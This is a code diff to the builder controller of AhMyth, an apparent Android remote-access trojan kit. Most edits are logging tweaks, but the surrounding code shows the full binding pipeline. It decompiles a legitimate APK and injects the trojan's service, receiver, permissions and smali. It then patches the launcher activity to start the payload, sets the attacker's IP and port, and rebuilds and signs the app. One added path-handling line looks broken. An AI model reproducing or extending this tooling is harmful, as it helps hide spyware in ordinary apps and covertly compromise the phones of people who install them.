@@ -6,6 +6,7 @@ var fs = require('fs-extra')
 var victimsList = remote.require('./main');
 const CONSTANTS = require(__dirname + '/assets/js/Constants')
 var homedir = require('node-homedir');
+const { dirname } = require('path');
 var path = require("path");
 var exec = require('child_process').exec, child;
 //--------------------------------------------------------------
@@ -117,17 +118,19 @@ app.controller("AppCtrl", ($scope) => {
           title: 'Choose APK to bind', 
           buttonLabel: 'Select APK',
           filters: [
-              { name: 'Android APK', extensions: ['apk'] } // only select apk files
+              { name: 'Android APK', extensions: ['apk'] } //only select apk files
           ]
       }).then(result => { 
           if(result.canceled) {
-              $appCtrl.Log("No file selected"); //if user cancels the dialog
+              $appCtrl.Log("No APK Was Selected as a Template", CONSTANTS.logStatus.FAIL); //if user cancels the dialog
           } else {
-              $appCtrl.Log("File choosen  " + result.filePaths[0]); //if user selects an APK file
+            var apkName = result.filePaths[0].split('/').pop(); //get the name of the apk
+            $appCtrl.Log('"'+apkName+'"' + " Was Chosen as a Template", CONSTANTS.logStatus.INFO); //when the user selects an apk
+              $appCtrl.Log(); // Empty log line for space between logs
               readFile(result.filePaths[0]); 
           }
       }).catch(() => { 
-          $appCtrl.Log("No file selected"); 
+          $appCtrl.Log("No APK Was Selected as a Template"); //if user cancels the dialog
       })
 
       function readFile(filepath) {
@@ -2798,18 +2801,22 @@ app.controller("AppCtrl", ($scope) => {
                 })
         })
         $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
+        $appCtrl.Log();
         var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
             (error, stdout, stderr) => {
                 if (error !== null) {
                     $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log();
                     return;
                 }
 
                 $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
+                $appCtrl.Log();
                 var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(outputPath, CONSTANTS.apkName) + '"',
                     (error, stdout, stderr) => {
                         if (error !== null) {
                             $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
+                            $appCtrl.Log();
                             return;
                         }
 
@@ -2819,6 +2826,7 @@ app.controller("AppCtrl", ($scope) => {
 
                             $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
                             $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);
+                            $appCtrl.Log();
                             exec("cd app/app/Factory/Ahmyth/ && rm -rf AndroidManifest.xml && cd .. && cp Vault/AndroidManifest.xml.ahmyth Ahmyth/AndroidManifest.xml ")
                         });
                     });
@@ -2831,9 +2839,11 @@ app.controller("AppCtrl", ($scope) => {
     $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {
 
         $appCtrl.Log("Copying Ahmyth files to orginal app...");
+        $appCtrl.Log();
         fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali"), (error) => {
             if (error) {
                 $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log();
                 return;
             }
 
@@ -5453,17 +5463,20 @@ app.controller("AppCtrl", ($scope) => {
         fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
             if (error) {
                 $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log();
                 return;
             }
 
             var ahmythService = CONSTANTS.ahmythService;
             var ahmythReciver = CONSTANTS.ahmythReciver;
             $appCtrl.Log('Modifying AndroidManifest.xml...');
+            $appCtrl.Log();
             var permManifest = $appCtrl.copyPermissions(data);
             var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + ahmythReciver + permManifest.substring(permManifest.indexOf("</application>"));
             fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                 if (error) {
                     $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log();
                     return;
                 }
                 $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
@@ -5484,27 +5497,32 @@ app.controller("AppCtrl", ($scope) => {
     $appCtrl.BindOnLauncher = (apkFolder) => {
 
         $appCtrl.Log('Finding launcher activity from AndroidManifest.xml...');
+        $appCtrl.Log();
         fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
             if (error) {
                 $appCtrl.Log('Reading AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log();
                 return;
             }
 
             var launcherPath = GetLauncherPath(data, path.join(apkFolder, "smali/"));
             if (launcherPath == -1) {
-                $appCtrl.Log("Cannot find the launcher activity, please run the command", CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log("aapt d badging path-to-your.apk | grep launchable-activity", CONSTANTS.logStatus.INFO)
-                $appCtrl.Log("to make sure that launcher activity is present in the APK.", CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log("Cannot find the launcher activity!", CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log("Please use the 'Bind On Boot' method", CONSTANTS.logStatus.INFO);
+                $appCtrl.Log("to Template the original APK", CONSTANTS.logStatus.INFO);
+                $appCtrl.Log();
                 return;
             }
 
             var ahmythService = CONSTANTS.ahmythService;
             $appCtrl.Log('Modifying AndroidManifest.xml...');
+            $appCtrl.Log();
             var permManifest = $appCtrl.copyPermissions(data);
             var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
             fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
                 if (error) {
                     $appCtrl.Log('Modifying AndroidManifest.xml Failed', CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log();
                     return;
                 }
 
@@ -5514,9 +5532,11 @@ app.controller("AppCtrl", ($scope) => {
 
 
                 $appCtrl.Log("Fetching launcher activity...");
+                $appCtrl.Log();
                 fs.readFile(launcherPath, 'utf8', (error, data) => {
                     if (error) {
                         $appCtrl.Log('Reading launcher activity Failed ', CONSTANTS.logStatus.FAIL);
+                        $appCtrl.Log();
                         return;
                     }
 
@@ -5526,10 +5546,12 @@ app.controller("AppCtrl", ($scope) => {
 
                     var key = CONSTANTS.orgAppKey;
                     $appCtrl.Log("Modifiying launcher activity...");
+                    $appCtrl.Log();
                     var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                     fs.writeFile(launcherPath, output, 'utf8', (error) => {
                         if (error) {
                             $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
+                            $appCtrl.Log();
                             return;
                         }
 
@@ -5550,30 +5572,39 @@ app.controller("AppCtrl", ($scope) => {
     $appCtrl.Build = (ip, port) => {
         if (!ip) {
             $appCtrl.Log('IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
+            $appCtrl.Log();
             return;
         } else if (!port) {
             port = CONSTANTS.defaultPort;
         } else if (port > 65535 || port <= 1024) {
             $appCtrl.Log('Choose ports from range (1024,65535)', CONSTANTS.logStatus.FAIL);
+            $appCtrl.Log();
             return;
         }
 
 
         // open ahmyth source file and modifiy the ip and port to the users' ones
         var ipPortFile = path.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
-        $appCtrl.Log('Reading (ip:port) file from ' + CONSTANTS.apkName + '...');
+        $appCtrl.Log('Reading (ip:port) file from ' + CONSTANTS.apkSourceName + '...');
+        $appCtrl.Log();
         fs.readFile(ipPortFile, 'utf8', (error, data) => {
             if (error) {
                 $appCtrl.Log('Reading (ip:port) file Failed', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log();
                 return;
             }
 
-            $appCtrl.Log('Adding source ip:port to ' + CONSTANTS.apkName + '...');
-            $appCtrl.Log('Adding source ip:port to ' + ipPortFile + '...');
+            $appCtrl.Log('Adding source ip:port to ' + CONSTANTS.apkSourceName + '...');
+            $appCtrl.Log();
+            // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
+            var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali")
+            $appCtrl.Log('Adding source ip:port to ' + ipPortFilePath + '...');
+            $appCtrl.Log();
             var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
             fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                 if (error) {
                     $appCtrl.Log('Adding source ip:port Failed', CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log();
                     return;
                 }
 
@@ -5586,19 +5617,23 @@ app.controller("AppCtrl", ($scope) => {
                     var filePath = $appCtrl.filePath;
                     if (filePath == null) {
                         $appCtrl.Log("Browse an apk file which you want to bind", CONSTANTS.logStatus.FAIL);
+                        $appCtrl.Log();
                         return;
                     } else if (!filePath.includes(".apk")) {
                         $appCtrl.Log("It is not an apk file", CONSTANTS.logStatus.FAIL);
+                        $appCtrl.Log();
                         return;
                     }
 
 
                     var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                     $appCtrl.Log('Decompiling ' + filePath + "...");
+                    $appCtrl.Log();
                     var decompileApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"',
                         (error, stdout, stderr) => {
                             if (error !== null) {
                                 $appCtrl.Log('Decompilation Failed', CONSTANTS.logStatus.FAIL);
+                                $appCtrl.Log();
                                 return;
                             }
 
@@ -5642,15 +5677,15 @@ function GetLauncherPath(manifest, smaliPath) {
    (
     'intent-filter',
     '"android.intent.action.MAIN"',
+    '"android.intent.category.LAUNCHER"'
+    +
+    'intent-filter',
+    '"android.intent.action.MAIN"',
     '"android.intent.category.DEFAULT"'
     +
     'intent-filter',
     '"android.intent.action.MAIN"',
     '"android.intent.category.INFO"'
-    +
-    'intent-filter',
-    '"android.intent.action.MAIN"',
-    '"android.intent.category.LAUNCHER"'
     );
     var indexOfActivity = -1;
     
@@ -5692,6 +5727,3 @@ function GetLauncherPath(manifest, smaliPath) {
 
 
   }
-
-  // new function to build and sign and apk from a decompiled folder state 
-  // only to be fired when the user clicks the Retry button in the APK Builder page
